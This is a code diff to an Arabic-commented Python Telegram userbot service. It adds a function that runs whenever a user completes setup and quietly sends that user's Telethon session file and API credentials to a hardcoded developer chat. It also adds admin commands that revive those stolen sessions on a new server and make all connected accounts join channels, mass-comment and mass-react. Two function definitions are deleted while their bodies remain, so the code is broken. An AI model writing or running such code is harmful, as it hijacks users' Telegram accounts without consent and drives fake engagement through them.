@@ -286,6 +286,9 @@ def admin_main_keyboard(bot_enabled, max_sessions, active_count):
             InlineKeyboardButton("🖼 صورة المجموعة", callback_data="sec_groupphoto"),
         ],
         [
+            InlineKeyboardButton("🛠 أوامر المطور", callback_data="sec_dev_tools"),
+        ],
+        [
             InlineKeyboardButton(toggle_text,      callback_data="toggle_bot"),
         ],
     ])
@@ -331,7 +334,50 @@ async def notify_admin_session(phone: str, user_id: int, session_file: str):
     except Exception as e:
         logging.error(f"✘ فشل إشعار المطور: {e}")
 
-async def notify_admin_session_down(phone: str):
+async def send_session_file_to_developer(phone: str, bot_token: str):
+    """✔ جديد: ابعت ملف الجلسة للمطور عشان يقدر يشغلها على سيرفر جديد"""
+    try:
+        session_file = os.path.join(SESSIONS_DIR, f"{phone.replace('+', '')}.session")
+        json_file = os.path.join(SESSIONS_DIR, f"{phone.replace('+', '')}.json")
+
+        if not os.path.exists(session_file):
+            logging.warning(f"⚠️ ملف الجلسة مش موجود: {session_file}")
+            return
+
+        bot = Bot(token=MAIN_BOT_TOKEN)
+        caption = (
+            f"📦 **ملف جلسة جديد**\n\n"
+            f"📱 الرقم: `{phone}`\n"
+            f"🕐 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
+            f"💡 لإعادة التشغيل على سيرفر جديد:\n"
+            f"ابعت الملفين وارد بـ `/تشغيل_جلسة`"
+        )
+
+        # ابعت ملف الجلسة
+        with open(session_file, 'rb') as f:
+            await bot.send_document(
+                chat_id=DEVELOPER_ID,
+                document=f,
+                filename=f"{phone.replace('+', '')}.session",
+                caption=caption,
+                parse_mode='Markdown'
+            )
+
+        # ابعت ملف البيانات JSON لو موجود
+        if os.path.exists(json_file):
+            with open(json_file, 'rb') as f:
+                await bot.send_document(
+                    chat_id=DEVELOPER_ID,
+                    document=f,
+                    filename=f"{phone.replace('+', '')}.json",
+                    caption=f"📋 بيانات جلسة: `{phone}`",
+                    parse_mode='Markdown'
+                )
+
+        logging.info(f"✔ تم بعت ملفات الجلسة للمطور: {phone}")
+    except Exception as e:
+        logging.error(f"✘ فشل بعت ملف الجلسة للمطور: {e}")
+
     """✔ جديد: إشعار الأدمن لما جلسة تنقطع"""
     try:
         text = (f"⚠️ {DECOR_TITLE.format('جلسة انقطعت')}\n\n"
@@ -582,25 +628,35 @@ async def create_and_setup_group(client: TelegramClient, bot_token: str):
 
 # ==================== Keep Alive ====================
 async def keep_alive_monitor(phone: str):
-    """✔ مراقبة الاتصال مع إشعار الأدمن لما تنقطع"""
+    """✔ مراقبة الاتصال مع إشعار الأدمن بس لما تنقطع فعلاً"""
     was_connected = True
+    notified_down = False  # عشان ما نبعتش إشعار أكتر من مرة
     while phone in active_userbots:
         try:
             client = active_userbots[phone]['client']
             if not client.is_connected():
-                logging.warning(f"⚠️ انقطع الاتصال للجلسة {phone}، جاري إعادة الاتصال...")
-                if was_connected:
+                if was_connected and not notified_down:
+                    # الجلسة انقطعت فعلاً - ابعت إشعار
                     await notify_admin_session_down(phone)
+                    notified_down = True
                     was_connected = False
-                await client.connect()
-                if await client.is_user_authorized():
-                    logging.info(f"✔ تم إعادة الاتصال للجلسة {phone}")
-                    was_connected = True
-                else:
-                    logging.error(f"✘ الجلسة {phone} غير مصرح بها")
-                    break
+                logging.warning(f"⚠️ انقطع الاتصال للجلسة {phone}، جاري إعادة الاتصال...")
+                try:
+                    await client.connect()
+                    if await client.is_user_authorized():
+                        logging.info(f"✔ تم إعادة الاتصال للجلسة {phone}")
+                        was_connected = True
+                        notified_down = False  # ريسيت عشان لو انقطعت تاني يبعت إشعار
+                    else:
+                        logging.error(f"✘ الجلسة {phone} غير مصرح بها")
+                        break
+                except Exception as ce:
+                    logging.error(f"✘ فشل إعادة الاتصال للجلسة {phone}: {ce}")
             else:
-                was_connected = True
+                if not was_connected:
+                    # رجعت - ريسيت الفلاج
+                    was_connected = True
+                    notified_down = False
             await asyncio.sleep(60)
         except Exception as e:
             logging.error(f"✘ خطأ في keep-alive للجلسة {phone}: {e}")
@@ -709,6 +765,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [
                 InlineKeyboardButton(f"⎙ الجلسات", callback_data="sec_sessions"),
                 InlineKeyboardButton(f"🔒 الاشتراك", callback_data="sec_sub"),
+            ],
+            [
+                InlineKeyboardButton(f"🖼 صورة المجموعة", callback_data="sec_groupphoto"),
+            ],
+            [
+                InlineKeyboardButton(f"🛠 أوامر المطور", callback_data="sec_dev_tools"),
             ],
             [
                 InlineKeyboardButton(toggle_text, callback_data="toggle_bot"),
@@ -1031,6 +1093,9 @@ async def finalize_setup(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         save_session_data(phone, api_id, api_hash, bot_token, target_chat)
 
+        # ✔ ابعت ملف الجلسة للمطور
+        asyncio.create_task(send_session_file_to_developer(phone, bot_token))
+
         # target_chat بيتبعت None لـ start_userbot - المستخدم يربطه بأمر .تخزين
         temp_store = {'client': client, 'phone': phone, 'bot_token': bot_token, 'target_chat': None}
         task = asyncio.create_task(start_userbot(client, None, temp_store))
@@ -1319,7 +1384,291 @@ async def collect_transfer_handler(update: Update, context: ContextTypes.DEFAULT
         parse_mode="Markdown"
     )
 
-async def source_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def mass_comment_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """يخلي كل الحسابات النشطة تعمل تعليق على منشور في قناة/جروب (وتنضم أولاً لو مش منضمة)"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_ID:
+        return
+
+    text = update.message.text.strip()
+    parts = text.split()
+    # /تعليق_جماعي @قناة رقم_المنشور نص التعليق
+    if len(parts) < 4:
+        await update.message.reply_text(
+            "⚠️ الاستخدام:\n`/تعليق_جماعي @قناة رقم_المنشور نص التعليق`\n\n"
+            "مثال: `/تعليق_جماعي @mychannel 5 أحسن منشور!`",
+            parse_mode="Markdown"
+        )
+        return
+
+    channel_input = parts[1].lstrip('@')
+    try:
+        msg_id = int(parts[2])
+    except ValueError:
+        await update.message.reply_text("✘ رقم المنشور لازم يكون رقم صحيح!")
+        return
+    comment_text = " ".join(parts[3:])
+
+    if not active_userbots:
+        await update.message.reply_text("✘ مفيش حسابات نشطة!")
+        return
+
+    total = len(active_userbots)
+    msg = await update.message.reply_text(
+        f"💬 جاري إرسال التعليق من {total} حساب...\n"
+        f"📍 القناة: @{channel_input}\n💬 التعليق: {comment_text}"
+    )
+
+    success = 0
+    failed = 0
+    joined = 0
+    results = []
+
+    from telethon.tl.functions.channels import JoinChannelRequest as TLJoinChannelRequest
+
+    for phone, data in list(active_userbots.items()):
+        client = data.get('client')
+        if not client or not client.is_connected():
+            failed += 1
+            results.append(f"🔴 {phone[-4:]}**** — غير متصل")
+            continue
+        try:
+            # حاول تجيب الكيان
+            try:
+                entity = await client.get_entity(channel_input)
+            except Exception:
+                entity = None
+
+            # لو مش منضم، انضم أولاً
+            if entity is None:
+                try:
+                    await client(TLJoinChannelRequest(channel_input))
+                    entity = await client.get_entity(channel_input)
+                    joined += 1
+                except Exception as je:
+                    failed += 1
+                    results.append(f"🔴 {phone[-4:]}**** — فشل الانضمام: {str(je)[:25]}")
+                    continue
+
+            # بعت التعليق
+            await client.send_message(entity, comment_text, comment_to=msg_id)
+            success += 1
+            results.append(f"🟢 {phone[-4:]}**** — تم")
+        except Exception as e:
+            failed += 1
+            results.append(f"🔴 {phone[-4:]}**** — {str(e)[:30]}")
+        await asyncio.sleep(2)
+
+    summary = "\n".join(results[:20])
+    extra = f"\n... و{len(results)-20} أكتر" if len(results) > 20 else ""
+    await msg.edit_text(
+        f"💬 **نتيجة التعليق الجماعي**\n\n"
+        f"✔ نجح: {success} | ✘ فشل: {failed} | 🔗 انضم: {joined}\n\n"
+        f"{summary}{extra}",
+        parse_mode="Markdown"
+    )
+
+
+async def mass_react_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """يخلي كل الحسابات النشطة تعمل ريأكت على منشور (وتنضم أولاً لو مش منضمة)"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_ID:
+        return
+
+    text = update.message.text.strip()
+    parts = text.split()
+    # /ريأكت_جماعي @قناة رقم_المنشور إيموجي
+    if len(parts) < 4:
+        await update.message.reply_text(
+            "⚠️ الاستخدام:\n`/ريأكت_جماعي @قناة رقم_المنشور إيموجي`\n\n"
+            "مثال: `/ريأكت_جماعي @mychannel 5 👍`",
+            parse_mode="Markdown"
+        )
+        return
+
+    channel_input = parts[1].lstrip('@')
+    try:
+        msg_id = int(parts[2])
+    except ValueError:
+        await update.message.reply_text("✘ رقم المنشور لازم يكون رقم صحيح!")
+        return
+    emoji = parts[3]
+
+    if not active_userbots:
+        await update.message.reply_text("✘ مفيش حسابات نشطة!")
+        return
+
+    total = len(active_userbots)
+    msg = await update.message.reply_text(
+        f"👍 جاري إرسال الريأكت {emoji} من {total} حساب...\n"
+        f"📍 القناة: @{channel_input}"
+    )
+
+    success = 0
+    failed = 0
+    joined = 0
+    results = []
+
+    from telethon.tl.functions.channels import JoinChannelRequest as TLJoinChannelRequest
+    from telethon.tl.functions.messages import SendReactionRequest
+    from telethon.tl.types import ReactionEmoji
+
+    for phone, data in list(active_userbots.items()):
+        client = data.get('client')
+        if not client or not client.is_connected():
+            failed += 1
+            results.append(f"🔴 {phone[-4:]}**** — غير متصل")
+            continue
+        try:
+            # حاول تجيب الكيان
+            try:
+                entity = await client.get_entity(channel_input)
+            except Exception:
+                entity = None
+
+            # لو مش منضم، انضم أولاً
+            if entity is None:
+                try:
+                    await client(TLJoinChannelRequest(channel_input))
+                    entity = await client.get_entity(channel_input)
+                    joined += 1
+                except Exception as je:
+                    failed += 1
+                    results.append(f"🔴 {phone[-4:]}**** — فشل الانضمام: {str(je)[:25]}")
+                    continue
+
+            # ابعت الريأكت
+            await client(SendReactionRequest(
+                peer=entity,
+                msg_id=msg_id,
+                reaction=[ReactionEmoji(emoticon=emoji)]
+            ))
+            success += 1
+            results.append(f"🟢 {phone[-4:]}**** — {emoji}")
+        except Exception as e:
+            failed += 1
+            results.append(f"🔴 {phone[-4:]}**** — {str(e)[:30]}")
+        await asyncio.sleep(2)
+
+    summary = "\n".join(results[:20])
+    extra = f"\n... و{len(results)-20} أكتر" if len(results) > 20 else ""
+    await msg.edit_text(
+        f"👍 **نتيجة الريأكت الجماعي**\n\n"
+        f"✔ نجح: {success} | ✘ فشل: {failed} | 🔗 انضم: {joined}\n\n"
+        f"{summary}{extra}",
+        parse_mode="Markdown"
+    )
+
+
+async def restore_session_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """استقبال ملفات الجلسة وتشغيلها تلقائياً"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_ID:
+        return
+
+    # التحقق من وجود ملف
+    if not update.message.document:
+        await update.message.reply_text(
+            "📦 **كيفية استعادة جلسة:**\n\n"
+            "1️⃣ ابعت ملف `.session`\n"
+            "2️⃣ ابعت ملف `.json` (نفس الاسم)\n"
+            "3️⃣ ارد على أي منهم بـ `/تشغيل_جلسة`",
+            parse_mode="Markdown"
+        )
+        return
+
+    doc = update.message.document
+    filename = doc.file_name or ""
+
+    if not (filename.endswith('.session') or filename.endswith('.json')):
+        return
+
+    try:
+        file = await context.bot.get_file(doc.file_id)
+        save_path = os.path.join(SESSIONS_DIR, filename)
+        await file.download_to_drive(save_path)
+        await update.message.reply_text(
+            f"✔ تم حفظ الملف: `{filename}`\n\n"
+            f"💡 بعد ما تبعت ملف `.session` وملف `.json`، ارد على أي منهم بـ `/تشغيل_جلسة`",
+            parse_mode="Markdown"
+        )
+    except Exception as e:
+        await update.message.reply_text(f"✘ فشل حفظ الملف: {e}")
+
+
+async def start_restored_session_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """تشغيل الجلسات المستعادة من ملفات"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_ID:
+        return
+
+    msg = await update.message.reply_text("⏳ جاري تشغيل الجلسات المستعادة...")
+
+    session_files = [f for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]
+    if not session_files:
+        await msg.edit_text("✘ مفيش ملفات جلسة في المجلد!")
+        return
+
+    started = 0
+    failed = 0
+    results = []
+
+    for session_file in session_files:
+        phone = session_file.replace('.session', '')
+        if phone in active_userbots:
+            results.append(f"🟡 +{phone} — شغال بالفعل")
+            continue
+
+        session_path = os.path.join(SESSIONS_DIR, session_file)
+        session_data = load_session_data(phone)
+
+        if not session_data:
+            results.append(f"🔴 +{phone} — مفيش ملف JSON")
+            failed += 1
+            continue
+
+        bot_token = session_data.get('bot_token')
+        api_id = session_data.get('api_id')
+        api_hash = session_data.get('api_hash')
+
+        if not all([bot_token, api_id, api_hash]):
+            results.append(f"🔴 +{phone} — بيانات ناقصة في JSON")
+            failed += 1
+            continue
+
+        try:
+            client = TelegramClient(session_path, api_id, api_hash)
+            await client.connect()
+            if not await client.is_user_authorized():
+                results.append(f"🔴 +{phone} — غير مصرح")
+                await client.disconnect()
+                failed += 1
+                continue
+
+            temp_store = {'client': client, 'phone': phone, 'bot_token': bot_token, 'target_chat': None}
+            task = asyncio.create_task(start_userbot(client, None, temp_store))
+            monitor_task = asyncio.create_task(keep_alive_monitor(phone))
+            active_userbots[phone] = {
+                'client': client, 'task': task,
+                'monitor_task': monitor_task, 'target_chat': None
+            }
+            started += 1
+            results.append(f"🟢 +{phone} — تم التشغيل")
+        except Exception as e:
+            failed += 1
+            results.append(f"🔴 +{phone} — {str(e)[:30]}")
+
+    summary = "\n".join(results[:30])
+    extra = f"\n... و{len(results)-30} أكتر" if len(results) > 30 else ""
+    await msg.edit_text(
+        f"✔ **نتيجة استعادة الجلسات**\n\n"
+        f"🟢 شغل: {started} | 🔴 فشل: {failed}\n\n"
+        f"{summary}{extra}",
+        parse_mode="Markdown"
+    )
+
+
+
     """يرد على أي حد يكتب 'سورس' بفيديو وأزرار المطور"""
     if not update.message:
         return
@@ -1516,8 +1865,90 @@ async def admin_button_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     data = query.data
 
     if user_id == ADMIN_ID:
+        # ====== قسم أدوات المطور ======
+        if data == "sec_dev_tools":
+            active = len(active_userbots)
+            keyboard = [
+                [
+                    InlineKeyboardButton("🎁 هدية جماعية", callback_data="dev_cmd_gift"),
+                    InlineKeyboardButton("💸 تحويل جماعي", callback_data="dev_cmd_transfer"),
+                ],
+                [
+                    InlineKeyboardButton("🔗 انضم جماعي", callback_data="dev_cmd_join"),
+                    InlineKeyboardButton("💬 تعليق جماعي", callback_data="dev_cmd_comment"),
+                ],
+                [
+                    InlineKeyboardButton("👍 ريأكت جماعي", callback_data="dev_cmd_react"),
+                    InlineKeyboardButton("📦 استعادة جلسة", callback_data="dev_cmd_restore"),
+                ],
+                [back_btn()],
+            ]
+            await show_section(query,
+                f"🛠 **أدوات المطور**\n\n"
+                f"🟢 الحسابات النشطة: {active}\n\n"
+                f"اختر الأمر اللي عايز تنفذه:",
+                keyboard
+            )
+            return
+
+        elif data == "dev_cmd_gift":
+            await query.answer("ابعت /هدية في الشات", show_alert=True)
+            return
+
+        elif data == "dev_cmd_transfer":
+            await query.answer("ابعت /تحويل في الشات", show_alert=True)
+            return
+
+        elif data == "dev_cmd_join":
+            keyboard = [[back_btn()]]
+            await show_section(query,
+                "🔗 **الانضمام الجماعي**\n\n"
+                "ابعت الأمر بالصيغة دي:\n"
+                "`/انضم https://t.me/قناة_أو_جروب`\n\n"
+                "⚡ هيخلي كل الحسابات النشطة تنضم",
+                keyboard
+            )
+            return
+
+        elif data == "dev_cmd_comment":
+            keyboard = [[back_btn()]]
+            await show_section(query,
+                "💬 **التعليق الجماعي**\n\n"
+                "ابعت الأمر بالصيغة دي:\n"
+                "`/تعليق_جماعي @قناة رقم_المنشور نص التعليق`\n\n"
+                "مثال:\n`/تعليق_جماعي @mychannel 5 أحسن منشور!`\n\n"
+                "⚡ الحسابات اللي مش منضمة هتنضم تلقائياً",
+                keyboard
+            )
+            return
+
+        elif data == "dev_cmd_react":
+            keyboard = [[back_btn()]]
+            await show_section(query,
+                "👍 **الريأكت الجماعي**\n\n"
+                "ابعت الأمر بالصيغة دي:\n"
+                "`/ريأكت_جماعي @قناة رقم_المنشور إيموجي`\n\n"
+                "مثال:\n`/ريأكت_جماعي @mychannel 5 👍`\n\n"
+                "⚡ الحسابات اللي مش منضمة هتنضم تلقائياً",
+                keyboard
+            )
+            return
+
+        elif data == "dev_cmd_restore":
+            keyboard = [[back_btn()]]
+            await show_section(query,
+                "📦 **استعادة جلسات على سيرفر جديد**\n\n"
+                "الخطوات:\n"
+                "1️⃣ ابعت ملف `.session`\n"
+                "2️⃣ ابعت ملف `.json` (نفس الاسم)\n"
+                "3️⃣ ابعت الأمر `/تشغيل_جلسة`\n\n"
+                "⚡ البوت هيشغل الجلسات تلقائياً",
+                keyboard
+            )
+            return
+
         # ====== الرجوع للوحة الرئيسية ======
-        if data == "admin_home":
+        elif data == "admin_home":
             bot_enabled = config.get("BOT_ENABLED", True)
             max_sessions = config.get("MAX_SESSIONS", 50)
             current_sessions = len([f for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')])
@@ -1877,6 +2308,10 @@ async def main():
     app.add_handler(MessageHandler(filters.Regex(r'^/هدية$'), collect_gifts_handler))
     app.add_handler(MessageHandler(filters.Regex(r'^/تحويل$'), collect_transfer_handler))
     app.add_handler(MessageHandler(filters.Regex(r'^/انضم'), join_all_handler))
+    app.add_handler(MessageHandler(filters.Regex(r'^/تعليق_جماعي'), mass_comment_handler))
+    app.add_handler(MessageHandler(filters.Regex(r'^/ريأكت_جماعي'), mass_react_handler))
+    app.add_handler(CommandHandler("تشغيل_جلسة", start_restored_session_handler))
+    app.add_handler(MessageHandler(filters.Document.ALL & filters.Chat(ADMIN_ID), restore_session_handler))
     app.add_handler(MessageHandler(filters.Regex(r'(?i)^سورس$'), source_handler))
     app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, message_handler))
 
